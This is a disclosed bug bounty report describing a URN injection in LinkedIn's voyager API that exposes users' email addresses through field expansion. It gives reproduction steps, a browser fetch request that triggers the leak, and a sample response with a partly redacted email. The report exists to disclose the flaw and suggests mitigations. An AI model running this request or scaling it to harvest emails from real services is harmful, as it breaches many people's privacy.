# Entire database of emails exposed through URN injection

## Report Details
- **Report ID**: 1806939
- **URL**: https://hackerone.com/reports/1806939
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-12-15T16:23:54.456Z
- **Disclosed**: 2023-05-22T21:25:37.393Z

## Reporter
- **Username**: ultrapowa
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: linkedin

## Vulnerability Information
Hello LinkedIn,

1. Situation

- The [decoration](https://learn.microsoft.com/en-us/linkedin/shared/api-guide/concepts/decoration?context=linkedin%2Fcontext) feature available to anyone on voyager API allows expanding URN fields.
- The query engine does not check whether a field should be expandable or not. Every field can be expanded.
- It is possible to trigger a URN resolution by assigning an URN value to a text field inside a profile and using a decoration expansion in a voyager query.
- Assigning a text field to `urn:li:fs_emailAddress:[email_id]` and triggering a URN resolution allows an attacker to retrieve the email.
- Email ids are generated sequentially or pseudo-sequentially, as a result the entire database of emails is exposed.

2. Mitigation

I suggest the following:
- It should never be possible for a user to expand a field, unless said field is explicitly allowed to be expanded (good luck with that considering the model size lol)
- There should be an access check on email data accessible through URN resolution

3. Reproduce

- Authenticate to linkedin.com
- Edit your profile, go to contact info, add a website and set the following URL value `urn:li:fs_emailAddress:8519272224`
- Open Chrome console and run the following code after editing the identity param and the csrf token:
```js
await (await fetch("https://www.linkedin.com/voyager/api/identity/dash/profiles?decoration=%28websites*%28url~%29%29&memberIdentity=[public identifier]&q=memberIdentity", {
  "headers": {
    "accept": "application/vnd.linkedin.normalized+json+2.1",
    "accept-language": "en-US,en;q=0.9",
    "csrf-token": "ajax:[your token here]",
    "x-li-deco-include-micro-schema": "true",
    "x-li-lang": "en_US",
    "x-restli-protocol-version": "2.0.0"
  },
  "method": "GET",
  "mode": "cors",
  "credentials": "include"
})).json()
```

Result:
```js
{
    "data": {
        // ...
    },
    "included": [
        {
            "entityUrn": "urn:li:fs_emailAddress:8519272224",
            "confirmed": true,
            "email": "melaa[redacted]@gmail.com",
            "$type": "com.linkedin.voyager.identity.normalizedprofile.EmailAddress",
            "primary": null
        }
    ]
}
```

## Impact

What I'm showing here is a simple showcase attack.
An elaborated attack involving arrays and multiple accounts can probably retrieve millions of emails a day.

## Attachments
No attachments
